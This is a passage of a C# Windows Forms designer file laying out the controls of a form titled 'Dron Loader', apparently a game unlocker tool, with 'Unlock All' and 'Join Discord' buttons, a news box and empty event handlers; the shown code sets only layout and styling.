            this.groupBox3.ForeColor = System.Drawing.Color.DodgerBlue;
            this.groupBox3.Location = new System.Drawing.Point(296, 62);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(207, 67);
            this.groupBox3.TabIndex = 6;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Panel Settings";
            this.groupBox3.Enter += new System.EventHandler(this.groupBox3_Enter);
            // 
            // siticoneColorTransition1
            // 
            this.siticoneColorTransition1.ColorArray = new System.Drawing.Color[] {
        System.Drawing.Color.Red,
        System.Drawing.Color.Blue,
        System.Drawing.Color.Orange};
            this.siticoneColorTransition1.EndColor = System.Drawing.Color.Black;
            this.siticoneColorTransition1.StartColor = System.Drawing.Color.Black;
            // 
            // unlockmw
            // 
            this.unlockmw.BackColor = System.Drawing.Color.Transparent;
            this.unlockmw.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.unlockmw.BorderRadius = 4;
            this.unlockmw.BorderStyle = System.Drawing.Drawing2D.DashStyle.Custom;
            this.unlockmw.BorderThickness = 1;
            this.unlockmw.CheckedState.Parent = this.unlockmw;
            this.unlockmw.CustomImages.Parent = this.unlockmw;
            this.unlockmw.FillColor = System.Drawing.Color.DodgerBlue;
            this.unlockmw.Font = new System.Drawing.Font("Microsoft YaHei UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.unlockmw.ForeColor = System.Drawing.Color.White;
            this.unlockmw.HoveredState.Parent = this.unlockmw;
            this.unlockmw.Location = new System.Drawing.Point(19, 28);
            this.unlockmw.Name = "unlockmw";
            this.unlockmw.ShadowDecoration.Parent = this.unlockmw;
            this.unlockmw.Size = new System.Drawing.Size(177, 45);
            this.unlockmw.TabIndex = 1;
            this.unlockmw.Text = "Unlock All";
            this.unlockmw.Click += new System.EventHandler(this.siticoneButton1_Click);
            // 
            // siticoneButton3
            // 
            this.siticoneButton3.BackColor = System.Drawing.Color.Transparent;
            this.siticoneButton3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.siticoneButton3.BorderRadius = 4;
            this.siticoneButton3.BorderStyle = System.Drawing.Drawing2D.DashStyle.Custom;
            this.siticoneButton3.BorderThickness = 1;
            this.siticoneButton3.CheckedState.Parent = this.siticoneButton3;
            this.siticoneButton3.CustomImages.Parent = this.siticoneButton3;
            this.siticoneButton3.FillColor = System.Drawing.Color.DodgerBlue;
            this.siticoneButton3.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.siticoneButton3.ForeColor = System.Drawing.Color.White;
            this.siticoneButton3.HoveredState.Parent = this.siticoneButton3;
            this.siticoneButton3.Location = new System.Drawing.Point(19, 79);
            this.siticoneButton3.Name = "siticoneButton3";
            this.siticoneButton3.ShadowDecoration.Parent = this.siticoneButton3;
            this.siticoneButton3.Size = new System.Drawing.Size(177, 45);
            this.siticoneButton3.TabIndex = 4;
            this.siticoneButton3.Text = "Join Discord";
            this.siticoneButton3.Click += new System.EventHandler(this.siticoneButton3_Click_1);
            // 
            // groupBox2
            // 
            this.groupBox2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(6)))), ((int)(((byte)(9)))), ((int)(((byte)(11)))));
            this.groupBox2.Controls.Add(this.siticoneButton3);
            this.groupBox2.Controls.Add(this.unlockmw);
            this.groupBox2.Font = new System.Drawing.Font("Microsoft YaHei UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox2.ForeColor = System.Drawing.Color.DodgerBlue;
            this.groupBox2.Location = new System.Drawing.Point(74, 62);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(213, 143);
            this.groupBox2.TabIndex = 5;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Unlock All";
            this.groupBox2.Click += new System.EventHandler(this.groupBox2_Click);
            this.groupBox2.Enter += new System.EventHandler(this.groupBox2_Enter);
            // 
            // siticonePanel1
            // 
            this.siticonePanel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(6)))), ((int)(((byte)(9)))), ((int)(((byte)(11)))));
            this.siticonePanel1.BorderColor = System.Drawing.Color.Transparent;
            this.siticonePanel1.BorderRadius = 5;
            this.siticonePanel1.BorderThickness = 1;
            this.siticonePanel1.Controls.Add(this.NewsBOX);
            this.siticonePanel1.Controls.Add(this.groupBox6);
            this.siticonePanel1.Location = new System.Drawing.Point(7, 16);
            this.siticonePanel1.Name = "siticonePanel1";
            this.siticonePanel1.ShadowDecoration.Parent = this.siticonePanel1;
            this.siticonePanel1.Size = new System.Drawing.Size(421, 100);
            this.siticonePanel1.TabIndex = 0;
            this.siticonePanel1.Paint += new System.Windows.Forms.PaintEventHandler(this.siticonePanel1_Paint);
            // 
            // NewsBOX
            // 
            this.NewsBOX.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(6)))), ((int)(((byte)(9)))), ((int)(((byte)(11)))));
            this.NewsBOX.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.NewsBOX.ForeColor = System.Drawing.Color.White;
            this.NewsBOX.Location = new System.Drawing.Point(6, 9);
            this.NewsBOX.Name = "NewsBOX";
            this.NewsBOX.ReadOnly = true;
            this.NewsBOX.Size = new System.Drawing.Size(407, 88);
            this.NewsBOX.TabIndex = 7;
            this.NewsBOX.Text = "Waiting...";
            this.NewsBOX.TextChanged += new System.EventHandler(this.richTextBox1_TextChanged);
            // 
            // groupBox6
            // 
            this.groupBox6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(6)))), ((int)(((byte)(9)))), ((int)(((byte)(11)))));
            this.groupBox6.Controls.Add(this.label5);
            this.groupBox6.Font = new System.Drawing.Font("Microsoft YaHei UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox6.ForeColor = System.Drawing.Color.DodgerBlue;
            this.groupBox6.Location = new System.Drawing.Point(12, 9);
            this.groupBox6.Name = "groupBox6";
            this.groupBox6.Size = new System.Drawing.Size(397, 66);
            this.groupBox6.TabIndex = 8;
            this.groupBox6.TabStop = false;
            this.groupBox6.Text = "Information";
            this.groupBox6.Click += new System.EventHandler(this.groupBox6_Click);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.ForeColor = System.Drawing.Color.White;
            this.label5.Location = new System.Drawing.Point(19, 29);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(307, 17);
            this.label5.TabIndex = 8;
            this.label5.Text = "This is user information, information about you.";
            // 
            // groupBox1
            // 
            this.groupBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(6)))), ((int)(((byte)(9)))), ((int)(((byte)(11)))));
            this.groupBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.groupBox1.Controls.Add(this.siticonePanel1);
            this.groupBox1.Font = new System.Drawing.Font("Microsoft YaHei UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox1.ForeColor = System.Drawing.Color.DodgerBlue;
            this.groupBox1.Location = new System.Drawing.Point(74, 211);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(435, 126);
            this.groupBox1.TabIndex = 4;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "News";
            this.groupBox1.Click += new System.EventHandler(this.groupBox1_Click);
            this.groupBox1.Enter += new System.EventHandler(this.groupBox1_Enter);
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = global::Registry.Properties.Resources.giphy;
            this.pictureBox1.Location = new System.Drawing.Point(61, 54);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(461, 300);
            this.pictureBox1.TabIndex = 10;
            this.pictureBox1.TabStop = false;
            // 
            // Main
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(12)))), ((int)(((byte)(18)))), ((int)(((byte)(22)))));
            this.ClientSize = new System.Drawing.Size(537, 366);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox4);
            this.Controls.Add(this.panel2);
            this.Controls.Add(this.groupBox3);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.UserInfo);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "Main";
            this.Opacity = 0D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Dron Loader";
            this.Load += new System.EventHandler(this.Main_Load);
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.panel2.ResumeLayout(false);
            this.groupBox4.ResumeLayout(false);
            this.UserInfo.ResumeLayout(false);
            this.groupBox5.ResumeLayout(false);
            this.groupBox5.PerformLayout();
            this.groupBox7.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.siticonePanel1.ResumeLayout(false);
            this.groupBox6.ResumeLayout(false);
            this.groupBox6.PerformLayout();
            this.groupBox1.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);

        }

        private void PaintBorderlessGroupBox(object sender, PaintEventArgs p)
        {
            System.Windows.Forms.GroupBox box = (System.Windows.Forms.GroupBox)sender;
            p.Graphics.Clear(SystemColors.Control);
            p.Graphics.DrawString(box.Text, box.Font, Brushes.Black, 0, 0);
            box.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(6)))), ((int)(((byte)(9)))), ((int)(((byte)(11)))));
        }

        private void UserInfo_Paint(object sender, PaintEventArgs e)
        {

        }

        private void groupBox6_Click(object sender, EventArgs e)
        {

        }

        private void groupBox1_Click(object sender, EventArgs e)
        {

        }

        private void groupBox2_Click(object sender, EventArgs e)
        {

        }

        private void groupBox3_Enter(object sender, EventArgs e)
        {
        }

        private void pictureBox3_Click(object sender, EventArgs e)
        {

        }
    }
}
